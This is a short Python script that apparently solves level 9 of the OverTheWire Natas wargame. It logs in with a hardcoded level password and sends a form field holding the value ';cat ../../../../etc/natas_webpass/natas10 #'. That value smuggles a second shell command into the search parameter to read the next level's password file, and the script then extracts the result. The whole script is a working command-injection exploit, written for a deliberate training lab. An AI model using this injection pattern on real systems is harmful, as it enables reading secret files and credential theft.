import requests
import re

usrname = 'natas9'
passwd = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = "http://%s.natas.labs.overthewire.org/" % usrname

session = requests.Session()

#response = session.get(url, auth = (usrname, passwd))
response = session.post(url, data = {"needle" : ";cat ../../../../etc/natas_webpass/natas10 #", "submit" : "submit"}, auth = (usrname, passwd))
content = response.text

#print(content)

print re.findall('pre>\n(.*)\n</' , content)[0]
